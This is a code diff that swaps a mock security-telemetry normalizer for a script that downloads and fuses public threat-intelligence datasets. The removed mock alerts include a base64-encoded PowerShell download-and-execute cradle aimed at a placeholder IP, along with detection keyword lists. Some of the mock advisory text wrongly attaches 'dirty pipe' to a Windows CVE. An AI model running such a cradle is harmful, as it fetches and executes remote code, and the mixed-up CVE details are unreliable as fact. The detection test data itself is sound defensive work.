@@ -1,544 +1,447 @@
 """
-ARES Telemetry Normalizer
-Converts heterogeneous raw logs (CEF, Syslog, EDR, Satellite Telemetry) into standard STIX 2.1 entities.
-Extracts IOCs, computes SHA-256 provenance hashes, and assigns severity.
+normalize_datasets.py
 
-When executed directly (`python -m src.engine.normalizer`), runs as a one-off Phase 1 batch process:
-  1. Generates mock multi-domain telemetry (SIEM, EDR, Satellite EW, SCADA, OSINT, Network flows)
-  2. Normalises every record into STIX 2.1-compatible objects with x_timestamp injection
-  3. Writes the unified fused dataset to `data/fused_dataset.json` and exits
+Downloads the selected static demo datasets and normalizes them into a single
+fused CSV/JSON with a common schema, ready to feed into the STIX adapters and
+the ATT&CK mapper. Also injects synthetic scenario timestamps/asset IDs so
+records from unrelated sources can be correlated (see SCENARIOS below).
+
+Run:
+    pip install requests pandas --break-system-packages
+    python normalize_datasets.py
+
+Output:
+    data/normalized/fused_dataset.csv
+    data/normalized/fused_dataset.json
 """
 
-import hashlib
 import json
-import os
-import re
-import uuid
+import random
+from pathlib import Path
 from datetime import datetime, timedelta, timezone
-from typing import Any, Dict, List, Optional
-from src.engine.schemas import (
-    RawTelemetryAlert,
-    NormalizedStixEntity,
-    SeverityLevel,
-    TelemetryDomain
-)
+
+import requests
+import pandas as pd
+
+RAW_DIR = Path("data/raw")
+OUT_DIR = Path("data")
+RAW_DIR.mkdir(parents=True, exist_ok=True)
+OUT_DIR.mkdir(parents=True, exist_ok=True)
+
+# --------------------------------------------------------------------------
+# 1. Source registry — direct download links confirmed working as of this
+#    build. If a link breaks, this is where to fix it.
+# --------------------------------------------------------------------------
+
+SOURCES = {
+    "mitre_enterprise": {
+        "url": "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json",
+        "path": RAW_DIR / "enterprise-attack.json",
+        "type": "json",
+    },
+    "mitre_ics": {
+        "url": "https://raw.githubusercontent.com/mitre/cti/master/ics-attack/ics-attack.json",
+        "path": RAW_DIR / "ics-attack.json",
+        "type": "json",
+    },
+    "cisa_kev": {
+        "url": "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json",
+        "path": RAW_DIR / "cisa_kev.json",
+        "type": "json",
+    },
+    "evtx_metadata": {
+        "url": "https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/raw/refs/heads/master/evtx_data.csv",
+        "path": RAW_DIR / "evtx_data.csv",
+        "type": "csv",
+    },
+    "telemanom_anomalies": {
+        "url": "https://raw.githubusercontent.com/khundman/telemanom/master/labeled_anomalies.csv",
+        "path": RAW_DIR / "labeled_anomalies.csv",
+        "type": "csv",
+    },
+    "et_rules_scan": {
+        "url": "https://rules.emergingthreats.net/open/suricata/rules/emerging-scan.rules",
+        "path": RAW_DIR / "emerging-scan.rules",
+        "type": "text",
+    },
+    "nasa_catalog": {
+        "url": "https://data.nasa.gov/data.json",
+        "path": RAW_DIR / "nasa_data.json",
+        "type": "json",
+    },
+    # CIC-IDS2018 is not a direct https download (S3 only). Fetch it once
+    # separately, then point this path at the local file:
+    #   aws s3 cp --no-sign-request \
+    #     "s3://cse-cic-ids2018/Processed Traffic Data for ML Algorithms/Thursday-01-03-2018_TrafficForML_CICFlowMeter.csv" \
+    #     data/raw/cic_ids2018_thursday.csv
+    "cic_ids2018": {
+        "url": None,
+        "path": RAW_DIR / "cic_ids2018_thursday.csv",
+        "type": "csv",
+    },
+    # Splunk attack_data uses git-lfs and technique-named folders, not a
+    # single flat file. Pull one technique folder manually, e.g.:
+    #   git clone --filter=blob:none https://github.com/splunk/attack_data.git
+    #   cd attack_data
+    #   git lfs pull --include="datasets/attack_techniques/T1003.001/atomic_red_team/windows-sysmon.log"
+    # then point this path at the pulled log file:
+    "splunk_attack_data": {
+        "url": None,
+        "path": RAW_DIR / "windows-sysmon.log",
+        "type": "text",
+        "technique_hint": "T1003.001",  # folder name IS the technique ID
+    },
+}
 
 
-class TelemetryNormalizer:
-    """Normalizes raw heterogeneous alert streams into structured STIX 2.1 objects."""
-
-    @staticmethod
-    def extract_iocs(text: str) -> List[str]:
-        """Extracts IPs, domain names, hashes, and asset tags from raw text."""
-        iocs = set()
-
-        # IPv4 pattern
-        ip_pattern = r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b'
-        for ip in re.findall(ip_pattern, text):
-            if not ip.startswith("127.") and ip != "0.0.0.0":
-                iocs.add(f"ipv4:{ip}")
-
-        # MD5 / SHA256 hashes
-        sha256_pattern = r'\b[a-fA-F0-9]{64}\b'
-        for h in re.findall(sha256_pattern, text):
-            iocs.add(f"hash-sha256:{h}")
-
-        md5_pattern = r'\b[a-fA-F0-9]{32}\b'
-        for h in re.findall(md5_pattern, text):
-            iocs.add(f"hash-md5:{h}")
-
-        # Satellite / Defense asset tags
-        asset_pattern = r'\b(SAT-[A-Z0-9-]+|PLC-[A-Z0-9-]+|GW-[0-9]+|S[0-9]-GW-[0-9]+)\b'
-        for asset in re.findall(asset_pattern, text):
-            iocs.add(f"defense-asset:{asset}")
-
-        # NORAD Catalog ID pattern
-        norad_pattern = r'\b(?:NORAD[:\s-]?|\bCATNR[:\s-]?)(\d{4,6})\b'
-        for norad in re.findall(norad_pattern, text, re.IGNORECASE):
-            iocs.add(f"norad-cat-id:{norad}")
-
-        # Real Spacecraft / Satellite Identifiers
-        sat_names = r'\b(SAR-LUPE\s*\d+|NAVSTAR\s*\d+|COSMO-SkyMed\s*\d*|SAPPHIRE|PRAETORIAN\s*[A-Z0-9_]*|MILSTAR\s*\d*|WGS-\d+)\b'
-        for sname in re.findall(sat_names, text, re.IGNORECASE):
-            iocs.add(f"defense-satellite-asset:{sname.strip()}")
-
-        # RF Bands & Jamming indicators
-        rf_pattern = r'\b(Ku-Band|Ka-Band|X-Band|C-Band|S-Band|UHF|SHF)\b'
-        for rf in re.findall(rf_pattern, text, re.IGNORECASE):
-            iocs.add(f"rf-band:{rf.upper()}")
-
-        return sorted(list(iocs))
-
-    @staticmethod
-    def calculate_severity(alert: RawTelemetryAlert) -> SeverityLevel:
-        """Determines alert severity based on domain, event code, and payload signals."""
-        payload_lower = alert.raw_payload.lower()
-
-        # Critical triggers
-        if any(w in payload_lower for w in ["critical", "zero_day", "unauthorized modbus", "transponder lock lost", "rf jamming", "carrier jamming", "dirty pipe"]):
-            return SeverityLevel.CRITICAL
-
-        # High triggers
-        if any(w in payload_lower for w in ["failed ssh logins", "auth_fail_burst", "powershell.exe", "lsass", "c2 node", "cobalt strike", "beaconing", "ephemeris_anomaly", "ephemeris drift", "telemetry lock disrupted", "doppler"]):
-            return SeverityLevel.HIGH
-
-        # Medium triggers
-        if any(w in payload_lower for w in ["port scan", "syn probe", "uncommon activity", "snr drop"]):
-            return SeverityLevel.MEDIUM
-
-        # Low triggers / benign
-        if any(w in payload_lower for w in ["info:", "scheduled", "authorized", "backup"]):
-            return SeverityLevel.LOW
-
-        return SeverityLevel.MEDIUM
-
-    @classmethod
-    def normalize_alert(cls, alert: RawTelemetryAlert) -> NormalizedStixEntity:
-        """Converts a single RawTelemetryAlert to a NormalizedStixEntity with cryptographic hash."""
-        # Calculate SHA-256 hash of raw payload for provenance tracking
-        raw_hash = hashlib.sha256(alert.raw_payload.encode("utf-8")).hexdigest()
-        
-        # Extract IOCs
-        iocs = cls.extract_iocs(alert.raw_payload)
-        if alert.source_ip:
-            iocs.append(f"src-ip:{alert.source_ip}")
-        if alert.destination_ip:
-            iocs.append(f"dst-ip:{alert.destination_ip}")
-        if alert.target_entity:
-            iocs.append(f"target:{alert.target_entity}")
-        iocs = sorted(list(set(iocs)))
-
-        severity = cls.calculate_severity(alert)
-        confidence = 0.95 if severity in [SeverityLevel.CRITICAL, SeverityLevel.HIGH] else 0.70
-
-        return NormalizedStixEntity(
-            stix_id=f"stix-obs-{alert.alert_id.lower()}",
-            original_alert_id=alert.alert_id,
-            timestamp=alert.timestamp,
-            domain=alert.domain,
-            entity_type="observed-data",
-            name=f"{alert.domain.value.upper()} Event [{alert.event_code or alert.source_name}]",
-            description=alert.raw_payload[:300],
-            severity=severity,
-            confidence=confidence,
-            iocs=iocs,
-            tactics_hint=alert.event_code,
-            raw_reference_hash=raw_hash
-        )
-
-    @classmethod
-    def normalize_batch(cls, alerts: List[RawTelemetryAlert]) -> List[NormalizedStixEntity]:
-        """Batch normalizes an incoming list of raw alerts."""
-        return [cls.normalize_alert(a) for a in alerts]
+def download(name, spec):
+    if spec["url"] is None:
+        if not spec["path"].exists():
+            print(f"[skip] {name}: no direct URL, fetch manually (see comment) "
+                  f"and place at {spec['path']}")
+        return
+    if spec["path"].exists():
+        print(f"[cache] {name}: already downloaded")
+        return
+    print(f"[download] {name}: {spec['url']}")
+    resp = requests.get(spec["url"], timeout=60)
+    resp.raise_for_status()
+    spec["path"].write_bytes(resp.content)
 
 
-# ---------------------------------------------------------------------------
-# Phase 1 helpers: mock telemetry generation
-# ---------------------------------------------------------------------------
+# --------------------------------------------------------------------------
+# 2. Scenario config — this is what makes unrelated static datasets look
+#    like one integrated system's logs. Every adapter tags its output with
+#    one of these scenarios: a shared asset_id, a rebased UTC time window,
+#    and a shared campaign_id.
+# --------------------------------------------------------------------------
 
-def _ts(offset_minutes: float = 0, base: Optional[datetime] = None) -> str:
-    """Returns an ISO 8601 UTC timestamp offset by the given number of minutes."""
-    ref = base or datetime.now(timezone.utc)
-    return (ref - timedelta(minutes=offset_minutes)).isoformat()
-
-
-def _build_mock_alerts() -> List[RawTelemetryAlert]:
-    """
-    Generates a diverse mock telemetry dataset covering five data-source categories:
-      1. Cyber SIEM (CEF / QRadar format)
-      2. EDR process execution logs (CrowdStrike Falcon)
-      3. Satellite EW / RF anomalies
-      4. SCADA / ICS Modbus telemetry
-      5. OSINT / threat-intel advisory feeds
-      6. Network flow sensor data (Suricata NIDS)
-    All records share a common schema anchored by strict x_timestamp injection.
-    """
-    now = datetime.now(timezone.utc)
-    alerts: List[RawTelemetryAlert] = []
-
-    # -----------------------------------------------------------------------
-    # 1. Cyber SIEM — credential stuffing burst (CEF format)
-    # -----------------------------------------------------------------------
-    alerts.append(RawTelemetryAlert(
-        alert_id=f"SIEM-{uuid.uuid4().hex[:8].upper()}",
-        timestamp=_ts(45, now),
-        domain=TelemetryDomain.CYBER_SIEM,
-        source_name="IBM-QRadar-SIEM",
-        raw_payload=(
-            "CEF:0|IBM|QRadar|7.5.0|AUTH_FAIL_BURST|"
-            "1,420 failed SSH logins within 45 seconds on Gateway-04|9|"
-            "src=198.51.100.44 dst=10.4.1.1 suser=svc_satcomm "
-            "msg=Multiple authentication failures followed by single successful login"
-        ),
-        sector="Sector-4-North",
-        target_entity="10.4.1.1",
-        source_ip="198.51.100.44",
-        destination_ip="10.4.1.1",
-        event_code="AUTH_FAIL_BURST",
-        metadata={"failed_attempts": 1420, "compromised_user": "svc_satcomm"},
-    ))
-
-    # -----------------------------------------------------------------------
-    # 2. Cyber SIEM — lateral movement / SMB discovery
-    # -----------------------------------------------------------------------
-    alerts.append(RawTelemetryAlert(
-        alert_id=f"SIEM-{uuid.uuid4().hex[:8].upper()}",
-        timestamp=_ts(38, now),
-        domain=TelemetryDomain.CYBER_SIEM,
-        source_name="IBM-QRadar-SIEM",
-        raw_payload=(
-            "CEF:0|IBM|QRadar|7.5.0|LATERAL_MOVE|"
-            "SMB share enumeration from 10.4.1.1 to 10.4.1.0/24|8|"
-            "src=10.4.1.1 dst=10.4.1.0/24 "
-            "msg=NetScan module detected; possible lateral movement"
-        ),
-        sector="Sector-4-North",
-        target_entity="10.4.1.0/24",
-        source_ip="10.4.1.1",
-        event_code="SMB_LATERAL_MOVE",
-        metadata={"scanned_hosts": 254},
-    ))
-
-    # -----------------------------------------------------------------------
-    # 3. EDR — encoded PowerShell + LSASS dump
-    # -----------------------------------------------------------------------
-    alerts.append(RawTelemetryAlert(
-        alert_id=f"EDR-{uuid.uuid4().hex[:8].upper()}",
-        timestamp=_ts(30, now),
-        domain=TelemetryDomain.CYBER_EDR,
-        source_name="CrowdStrike-Falcon-EDR",
-        raw_payload=(
-            "PROCESS_INJECTION: powershell.exe -NonI -W Hidden -enc "
-            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
-            "LgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4A"
-            "MQAxADMALgA4ADgALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA== spawned by svc_satcomm "
-            "on S4-GW-01. Attempted LSASS memory dump."
-        ),
-        sector="Sector-4-North",
-        target_entity="S4-GW-01",
-        source_ip="10.4.1.1",
-        event_code="EDR_PROCESS_SUSPICIOUS",
-        metadata={"process_name": "powershell.exe", "encoded_command": True},
-    ))
-
-    # -----------------------------------------------------------------------
-    # 4. EDR — persistence via registry run key
-    # -----------------------------------------------------------------------
-    alerts.append(RawTelemetryAlert(
-        alert_id=f"EDR-{uuid.uuid4().hex[:8].upper()}",
-        timestamp=_ts(27, now),
-        domain=TelemetryDomain.CYBER_EDR,
-        source_name="CrowdStrike-Falcon-EDR",
-        raw_payload=(
-            "REGISTRY_MOD: svchost.exe created registry key "
-            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AresBeacon "
-            "pointing to C:\\Windows\\Temp\\update_svc.exe on host S4-GW-01."
-        ),
-        sector="Sector-4-North",
-        target_entity="S4-GW-01",
-        source_ip="10.4.1.1",
-        event_code="EDR_REGISTRY_PERSISTENCE",
-        metadata={"registry_key": "HKLM\\...\\Run\\AresBeacon"},
-    ))
-
-    # -----------------------------------------------------------------------
-    # 5. Network flow — C2 HTTPS beaconing
-    # -----------------------------------------------------------------------
-    alerts.append(RawTelemetryAlert(
-        alert_id=f"NET-{uuid.uuid4().hex[:8].upper()}",
-        timestamp=_ts(22, now),
-        domain=TelemetryDomain.CYBER_SIEM,
-        source_name="Suricata-NIDS",
-        raw_payload=(
-            "SURICATA_ALERT: Suspicious periodic HTTPS outbound beaconing (jitter 3.2%) "
-            "to known APT C2 node 203.0.113.88:443. "
-            "JA3 TLS fingerprint matches Cobalt Strike malleable C2 profile. "
-            "Interval 30 s, duration > 2 h."
-        ),
-        sector="Sector-4-North",
-        target_entity="S4-GW-01",
-        source_ip="10.4.1.1",
-        destination_ip="203.0.113.88",
-        event_code="NIDS_C2_BEACON",
-        metadata={"ja3_hash": "e7d705a3286e19ea42f587b344ee6865", "beacon_interval_sec": 30},
-    ))
-
-    # -----------------------------------------------------------------------
-    # 6. Network flow — DNS tunnelling exfil
-    # -----------------------------------------------------------------------
-    alerts.append(RawTelemetryAlert(
-        alert_id=f"NET-{uuid.uuid4().hex[:8].upper()}",
-        timestamp=_ts(18, now),
-        domain=TelemetryDomain.CYBER_SIEM,
-        source_name="Suricata-NIDS",
-        raw_payload=(
-            "SURICATA_ALERT: High-entropy DNS TXT record requests from 10.4.1.1 "
-            "to resolver 8.8.8.8; avg label length 58 chars, query rate 120/min. "
-            "Possible DNS tunnelling exfiltration channel (iodine/dnscat2)."
-        ),
-        sector="Sector-4-North",
-        target_entity="10.4.1.1",
-        source_ip="10.4.1.1",
-        destination_ip="8.8.8.8",
-        event_code="NIDS_DNS_TUNNEL",
-        metadata={"avg_label_length": 58, "query_rate_per_min": 120},
-    ))
-
-    # -----------------------------------------------------------------------
-    # 7. Satellite EW — Ku-band RF carrier jamming
-    # -----------------------------------------------------------------------
-    alerts.append(RawTelemetryAlert(
-        alert_id=f"SAT-{uuid.uuid4().hex[:8].upper()}",
-        timestamp=_ts(50, now),
-        domain=TelemetryDomain.SATELLITE_EW,
-        source_name="SAT-GROUND-RELAY-04",
-        raw_payload=(
-            "ANOMALY: High-power RF carrier jamming detected on 14.2 GHz uplink (Ku-Band). "
-            "Signal-to-Noise Ratio (SNR) dropped by 18.4 dB. "
-            "Transponder lock lost on SAT-DEF-09. "
-            "Estimated jammer EIRP > 50 dBW."
-        ),
-        sector="Sector-4-North",
-        target_entity="SAT-DEF-09",
-        event_code="SAT_RF_JAM_ALERT",
-        metadata={"snr_drop_db": 18.4, "frequency_ghz": 14.2, "carrier_band": "Ku-Band"},
-    ))
-
-    # -----------------------------------------------------------------------
-    # 8. Satellite EW — ephemeris drift / orbital anomaly
-    # -----------------------------------------------------------------------
-    alerts.append(RawTelemetryAlert(
-        alert_id=f"SAT-{uuid.uuid4().hex[:8].upper()}",
-        timestamp=_ts(42, now),
-        domain=TelemetryDomain.SATELLITE_EW,
-        source_name="GPS-Constellation-Monitor",
-        raw_payload=(
-            "EPHEMERIS_ANOMALY: NAVSTAR GPS PRN-21 broadcasting corrupted ephemeris data. "
-            "Predicted vs observed Doppler residual delta 4.8 kHz exceeds 2σ threshold. "
-            "Possible GPS spoofing attack. Correlated with Ku-Band jamming in Sector-4-North."
-        ),
-        sector="Sector-4-North",
-        target_entity="NAVSTAR 21",
-        event_code="GPS_EPHEMERIS_SPOOF",
-        metadata={"prn": 21, "doppler_delta_khz": 4.8},
-    ))
-
-    # -----------------------------------------------------------------------
-    # 9. SCADA / ICS — Modbus unauthorized write (PLC antenna controller)
-    # -----------------------------------------------------------------------
-    alerts.append(RawTelemetryAlert(
-        alert_id=f"ICS-{uuid.uuid4().hex[:8].upper()}",
-        timestamp=_ts(10, now),
-        domain=TelemetryDomain.SATELLITE_EW,
-        source_name="SCADA-GROUND-PLC-02",
-        raw_payload=(
-            "CRITICAL: Unauthorized Modbus/TCP command (Function Code 16 — Write Multiple "
-            "Holding Registers) sent to Satellite Antenna Azimuth/Elevation Controller "
-            "from S4-GW-01. Commanded 45-degree off-axis misalignment on PLC-AZ-EL-02."
-        ),
-        sector="Sector-4-North",
-        target_entity="PLC-AZ-EL-02",
-        source_ip="10.4.1.1",
-        event_code="ICS_MODBUS_UNAUTHORIZED_WRITE",
-        metadata={"function_code": 16, "tampered_register": "ANTENNA_SLEW_RATE"},
-    ))
-
-    # -----------------------------------------------------------------------
-    # 10. SCADA / ICS — historian data manipulation
-    # -----------------------------------------------------------------------
-    alerts.append(RawTelemetryAlert(
-        alert_id=f"ICS-{uuid.uuid4().hex[:8].upper()}",
-        timestamp=_ts(8, now),
-        domain=TelemetryDomain.SATELLITE_EW,
-        source_name="OSIsoft-PI-Historian",
-        raw_payload=(
-            "CRITICAL: Historian tag values for POWER_BUS_VOLTAGE and THERMAL_CONTROL "
-            "overwritten with static replayed values. Likely sensor-replay attack on "
-            "ground-station power management subsystem."
-        ),
-        sector="Sector-4-North",
-        target_entity="PI-Historian-GS-04",
-        source_ip="10.4.1.1",
-        event_code="ICS_HISTORIAN_REPLAY_ATTACK",
-        metadata={"affected_tags": ["POWER_BUS_VOLTAGE", "THERMAL_CONTROL"]},
-    ))
-
-    # -----------------------------------------------------------------------
-    # 11. OSINT — dark-web APT advisory (STIX 2.1 feed)
-    # -----------------------------------------------------------------------
-    alerts.append(RawTelemetryAlert(
-        alert_id=f"OSINT-{uuid.uuid4().hex[:8].upper()}",
-        timestamp=_ts(120, now),
-        domain=TelemetryDomain.OSINT_INTEL,
-        source_name="CISA-ADVISORY-FEED",
-        raw_payload=(
-            "CISA AA24-317A: APT28 (Fancy Bear) campaign targeting satellite ground-station "
-            "operators. Known C2 IPs: 203.0.113.88, 198.51.100.99. "
-            "Techniques: T1078 (Valid Accounts), T1059.001 (PowerShell), "
-            "T1071.001 (Web Protocols), T0814 (Denial of Control). "
-            "Attribution confidence 89%."
-        ),
-        sector="Sector-Global",
-        event_code="OSINT_APT_ADVISORY",
-        metadata={"advisory_id": "AA24-317A", "threat_actor": "APT28"},
-    ))
-
-    # -----------------------------------------------------------------------
-    # 12. OSINT — CVE bulletin
-    # -----------------------------------------------------------------------
-    alerts.append(RawTelemetryAlert(
-        alert_id=f"OSINT-{uuid.uuid4().hex[:8].upper()}",
-        timestamp=_ts(90, now),
-        domain=TelemetryDomain.OSINT_INTEL,
-        source_name="NVD-FEED",
-        raw_payload=(
-            "CVE-2024-30088 CVSS 9.8: Windows Kernel privilege escalation via dirty pipe "
-            "used in the wild by Sandworm (APT44) against military-sector targets. "
-            "Patch MS24-DEC available. CISA KEV confirmed."
-        ),
-        sector="Sector-Global",
-        event_code="CVE_KEV_ALERT",
-        metadata={"cve_id": "CVE-2024-30088", "cvss": 9.8, "kev_confirmed": True},
-    ))
-
-    # -----------------------------------------------------------------------
-    # 13. Adversarial chaff — decoy port-scan flood (10 records)
-    # -----------------------------------------------------------------------
-    for i in range(10):
-        alerts.append(RawTelemetryAlert(
-            alert_id=f"CHAFF-{i:04d}",
-            timestamp=_ts(3 + i * 0.3, now),
-            domain=TelemetryDomain.CYBER_SIEM,
-            source_name="Edge-Firewall-Noise",
-            raw_payload=(
-                f"FW_DROP: Inbound TCP SYN probe dropped from 192.0.2.{i * 13 % 250} "
-                f"on port {1024 + i}. No service listening."
-            ),
-            sector="Sector-2-East",
-            target_entity="Edge-Firewall-Cluster",
-            source_ip=f"192.0.2.{i * 13 % 250}",
-            event_code="FW_SYN_DROP",
-            metadata={"is_synthetic_decoy": True},
-        ))
-
-    # -----------------------------------------------------------------------
-    # 14. Stealth zero-day hidden inside chaff (Sector-2-East)
-    # -----------------------------------------------------------------------
-    alerts.append(RawTelemetryAlert(
-        alert_id="STEALTH-001",
-        timestamp=_ts(4.5, now),
-        domain=TelemetryDomain.CYBER_EDR,
-        source_name="CrowdStrike-Falcon-EDR",
-        raw_payload=(
-            "ZERO_DAY_EXFIL: Stealth privilege escalation via dirty pipe exploit followed "
-            "by unencrypted database dump of tactical operational plans to external VPS "
-            "198.51.100.99."
-        ),
-        sector="Sector-2-East",
-        target_entity="Ops-Database-Core",
-        source_ip="10.2.0.50",
-        destination_ip="198.51.100.99",
-        event_code="STEALTH_DATA_EXFIL",
-        metadata={"is_synthetic_decoy": False, "high_value_target": "Ops-Database-Core"},
-    ))
-
-    # -----------------------------------------------------------------------
-    # 15. Benign background noise (authorized scanner + backup job)
-    # -----------------------------------------------------------------------
-    alerts.append(RawTelemetryAlert(
-        alert_id="BENIGN-01",
-        timestamp=_ts(60, now),
-        domain=TelemetryDomain.CYBER_SIEM,
-        source_name="Nessus-Vulnerability-Scanner",
-        raw_payload=(
-            "INFO: Scheduled weekly authorized vulnerability scanner 10.3.0.254 "
-            "scanned 50 hosts in Subnet 10.3.0.0/24."
-        ),
-        sector="Sector-3-Central",
-        target_entity="10.3.0.0/24",
-        source_ip="10.3.0.254",
-        event_code="NESSUS_SCAN_AUTHORIZED",
-        metadata={"authorized": True},
-    ))
-    alerts.append(RawTelemetryAlert(
-        alert_id="BENIGN-02",
-        timestamp=_ts(55, now),
-        domain=TelemetryDomain.CYBER_EDR,
-        source_name="Veeam-Backup-Agent",
-        raw_payload=(
-            "INFO: High disk I/O and mass file read detected by VeeamBackupService.exe "
-            "during scheduled incremental backup."
-        ),
-        sector="Sector-3-Central",
-        target_entity="FileServer-03",
-        event_code="BACKUP_JOB_COMPLETED",
-        metadata={"authorized": True},
-    ))
-
-    return alerts
+SCENARIOS = [
+    {
+        "campaign_id": "CAMPAIGN-ALPHA",
+        "asset_id": "GS-EAST-04",          # fictional ground-station asset
+        "window_start": datetime(2026, 9, 10, 6, 0, tzinfo=timezone.utc),
+        "window_end": datetime(2026, 9, 10, 9, 0, tzinfo=timezone.utc),
+    },
+    {
+        "campaign_id": "CAMPAIGN-BRAVO",
+        "asset_id": "SAT-ALPHA-1",         # fictional spacecraft asset
+        "window_start": datetime(2026, 9, 11, 13, 0, tzinfo=timezone.utc),
+        "window_end": datetime(2026, 9, 11, 15, 30, tzinfo=timezone.utc),
+    },
+    {
+        "campaign_id": "CAMPAIGN-CHARLIE",
+        "asset_id": "NET-PERIM-11",        # fictional perimeter/network asset
+        "window_start": datetime(2026, 9, 12, 2, 0, tzinfo=timezone.utc),
+        "window_end": datetime(2026, 9, 12, 4, 0, tzinfo=timezone.utc),
+    },
+]
 
 
-def _stix_entity_to_dict(entity: NormalizedStixEntity) -> Dict[str, Any]:
-    """
-    Serialises a NormalizedStixEntity as a STIX 2.1-shaped dict, injecting the
-    mandatory `x_timestamp` extension field required by the correlation engine.
-    """
+def random_timestamp(scenario):
+    span = (scenario["window_end"] - scenario["window_start"]).total_seconds()
+    return scenario["window_start"] + timedelta(seconds=random.uniform(0, span))
+
+
+def pick_scenario(index):
+    # Round-robin so records spread across all fake incidents rather than
+    # piling into one — real correlation still depends on overlapping
+    # asset_id + time window, this just seeds the pool.
+    return SCENARIOS[index % len(SCENARIOS)]
+
+
+# --------------------------------------------------------------------------
+# 3. Common normalized record schema
+#    Every adapter emits dicts shaped like this. This is the schema the
+#    STIX adapters (Indicator/Observed Data/Sighting) and ATT&CK
+#    technique_linker.py consume downstream.
+# --------------------------------------------------------------------------
+
+FUSED_COLUMNS = [
+    "record_id", "source", "timestamp", "scenario_campaign_id", "asset_id",
+    "technique_id", "technique_name", "description", "confidence_hint",
+    "lat", "lon", "raw_ref",
+]
+
+
+def make_record(record_id, source, scenario, technique_id=None,
+                 technique_name=None, description="", confidence_hint="unscored",
+                 lat=None, lon=None, raw_ref=""):
     return {
-        # --- STIX 2.1 core fields ---
-        "type": entity.entity_type,                   # e.g. "observed-data"
-        "spec_version": "2.1",
-        "id": entity.stix_id,
-        "created": entity.timestamp,
-        "modified": entity.timestamp,
-        "name": entity.name,
-        "description": entity.description,
-        "confidence": int(entity.confidence * 100),   # STIX confidence is 0–100
-        # --- STIX 2.1 custom extension fields (x_ prefix) ---
-        "x_timestamp": entity.timestamp,              # canonical timestamp for correlation window
-        "x_severity": entity.severity.value,
-        "x_domain": entity.domain.value,
-        "x_iocs": entity.iocs,
-        "x_tactics_hint": entity.tactics_hint,
-        "x_original_alert_id": entity.original_alert_id,
-        "x_sha256_provenance": entity.raw_reference_hash,
+        "record_id": record_id,
+        "source": source,
+        "timestamp": random_timestamp(scenario).isoformat(),
+        "scenario_campaign_id": scenario["campaign_id"],
+        "asset_id": scenario["asset_id"],
+        "technique_id": technique_id or "",
+        "technique_name": technique_name or "",
+        "description": description,
+        "confidence_hint": confidence_hint,
+        "lat": lat,
+        "lon": lon,
+        "raw_ref": raw_ref,
     }
 
 
-def run_phase1_batch(output_path: str = "data/fused_dataset.json") -> None:
+# --------------------------------------------------------------------------
+# 4. Per-source adapters
+#    NOTE: evtx_data.csv and cic_ids2018 column names should be confirmed
+#    by inspecting the first few rows locally (`head -1 file.csv`) before
+#    relying on this — column names below are best-effort with a fallback.
+# --------------------------------------------------------------------------
+
+def adapt_evtx_metadata():
+    path = SOURCES["evtx_metadata"]["path"]
+    if not path.exists():
+        return []
+    df = pd.read_csv(path, on_bad_lines="skip", engine="python")
+    technique_col = next((c for c in df.columns if "technique" in c.lower()), None)
+    name_col = next((c for c in df.columns if "file" in c.lower() or "name" in c.lower()), df.columns[0])
+
+    records = []
+    for i, row in df.iterrows():
+        scenario = pick_scenario(i)
+        records.append(make_record(
+            record_id=f"evtx-{i}",
+            source="cyber_sensor:evtx",
+            scenario=scenario,
+            technique_id=str(row[technique_col]) if technique_col else "",
+            description=f"EVTX-labeled event: {row.get(name_col, '')}",
+            confidence_hint="labeled",
+            raw_ref=str(row.get(name_col, "")),
+        ))
+    return records
+
+
+def adapt_splunk_attack_data():
+    spec = SOURCES["splunk_attack_data"]
+    path = spec["path"]
+    if not path.exists():
+        return []
+    technique_id = spec.get("technique_hint", "")
+    records = []
+    with open(path, "r", errors="ignore") as f:
+        lines = [l.strip() for l in f if l.strip()][:500]  # cap for demo size
+    for i, line in enumerate(lines):
+        scenario = pick_scenario(i)
+        records.append(make_record(
+            record_id=f"splunkdata-{i}",
+            source="siem:splunk_attack_data",
+            scenario=scenario,
+            technique_id=technique_id,
+            description="Sysmon/security event from splunk/attack_data corpus",
+            confidence_hint="labeled",  # folder name = ground-truth technique
+            raw_ref=line[:200],
+        ))
+    return records
+
+
+def adapt_telemanom():
+    path = SOURCES["telemanom_anomalies"]["path"]
+    if not path.exists():
+        return []
+    df = pd.read_csv(path)
+    records = []
+    for i, row in df.iterrows():
+        scenario = pick_scenario(i)
+        chan = row.get("chan_id", row.get("channel", f"CH-{i}"))
+        records.append(make_record(
+            record_id=f"telemanom-{i}",
+            source="satellite_feed:telemanom",
+            scenario=scenario,
+            description=f"Anomaly on spacecraft channel {chan}",
+            confidence_hint="sensor_anomaly",  # NOT a cyberattack label
+            raw_ref=str(chan),
+        ))
+    return records
+
+
+def simulate_satellite_events(n=25):
     """
-    Phase 1 entry point — runs once, writes `fused_dataset.json`, and exits.
-
-    Steps:
-      1. Generate mock multi-domain telemetry alerts
-      2. Normalise every alert into a STIX 2.1 NormalizedStixEntity
-      3. Serialise to dicts (injecting x_timestamp on each record)
-      4. Write to `output_path`
+    Simulated satellite/geospatial telemetry as suggested: lat/lon + event
+    type JSON, tagged into the same scenario campaigns so it can correlate
+    against the cyber-side records above (e.g. a ground-station asset_id
+    shared with a SIEM/EVTX alert in the same time window).
     """
-    print("[ARES Phase 1] Generating mock multi-domain telemetry…")
-    raw_alerts = _build_mock_alerts()
-    print(f"             {len(raw_alerts)} raw alerts generated across "
-          f"{len({a.domain for a in raw_alerts})} domains.")
+    event_types = [
+        "gps_signal_loss", "rf_snr_drop", "unexpected_reboot",
+        "unauthorized_command_attempt", "telemetry_gap", "orbit_deviation_flag",
+    ]
+    # Rough real-world-ish coordinate spread (ground stations / LEO passes)
+    coord_pool = [
+        (38.9, -77.0), (51.5, -0.1), (35.0, 139.0), (-33.9, 18.4),
